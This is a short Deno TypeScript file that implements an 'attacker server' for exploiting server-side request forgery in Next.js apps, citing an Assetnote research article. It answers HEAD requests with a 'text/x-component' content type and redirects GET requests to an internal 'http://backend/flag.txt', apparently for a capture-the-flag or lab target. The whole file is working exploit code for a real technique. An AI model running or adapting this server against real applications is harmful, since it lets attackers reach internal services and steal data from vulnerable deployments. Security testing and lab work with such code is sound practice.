// Attacker server to test SSRF vulnerability in the target server
// https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps
Deno.serve((request: Request) => {              
    console.log("Request received: " + JSON.stringify({                                                                
        url: request.url,
        method: request.method,
        headers: Array.from(request.headers.entries()),
    }));
    // Head - 'Content-Type', 'text/x-component');
    if (request.method === 'HEAD') {
        return new Response(null, {
            headers: {
                'Content-Type': 'text/x-component',
            },
        });
    }
    // Get - redirect to http://backend/flag.txt
    if (request.method === 'GET') {
        return new Response(null, {
            status: 302,
            headers: {
                Location: 'http://backend/flag.txt',
            },
        });
    }
});
